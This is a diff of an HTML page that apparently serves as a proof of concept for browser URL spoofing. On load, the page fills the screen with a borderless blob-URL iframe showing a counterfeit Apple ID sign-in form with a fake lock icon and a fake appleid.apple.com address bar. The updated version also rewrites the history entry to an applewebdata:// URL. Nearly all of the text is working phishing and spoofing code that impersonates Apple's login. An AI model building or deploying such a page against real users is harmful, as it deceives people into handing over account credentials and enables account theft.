@@ -1,33 +1,34 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Blob Iframe Spoof - Scenario 1</title>
+  <title>Applewebdata Spoof - Scenario 1</title>
   <script>
-    async function createBlobSpoof() {
-      const spoofedHTML = `
+    function simulateAppleWebdataSpoof() {
+      const spoofContent = `
         <html>
-          <head><title>Apple ID</title></head>
-          <body style='margin:0;font-family:-apple-system;background:#f9f9f9;'>
-            <div style='background:#eee;padding:10px;font-size:14px;'>🔒 https://appleid.apple.com</div>
-            <div style='padding:20px;'>
-              <h2>Sign in with your Apple ID</h2>
-              <input placeholder='Apple ID' style='width:100%;padding:10px;margin:10px 0;'>
-              <input type='password' placeholder='Password' style='width:100%;padding:10px;margin:10px 0;'>
-              <button style='padding:10px;width:100%;background:#007aff;color:white;'>Sign In</button>
-            </div>
-          </body>
+        <head><title>Apple ID</title></head>
+        <body style='margin:0;font-family:-apple-system;'>
+          <div style='background:#eee;padding:10px;font-size:14px;'>🔒 https://appleid.apple.com</div>
+          <div style='padding:20px;'>
+            <h2>Sign in with your Apple ID</h2>
+            <input placeholder='Apple ID' style='width:100%;padding:10px;'>
+            <input type='password' placeholder='Password' style='width:100%;padding:10px;'>
+            <button style='padding:10px;width:100%;background:#007aff;color:white;'>Sign In</button>
+          </div>
+        </body>
         </html>`;
 
-      const blob = new Blob([spoofedHTML], { type: 'text/html' });
+      const blob = new Blob([spoofContent], { type: 'text/html' });
       const blobURL = URL.createObjectURL(blob);
-
       const iframe = document.createElement('iframe');
-      iframe.style = 'width:100vw;height:100vh;border:none;';
       iframe.src = blobURL;
+      iframe.style = 'width:100vw;height:100vh;border:none;';
       document.body.appendChild(iframe);
-    }
 
-    window.onload = createBlobSpoof;
+      // Simulate internal redirection to applewebdata URL on reload/fallback
+      history.replaceState({}, '', 'applewebdata://B2F21D7E-61BA-4FC1-95F3-127741F4C123/index.html');
+    }
+    window.onload = simulateAppleWebdataSpoof;
   </script>
 </head>
 <body style="margin:0">
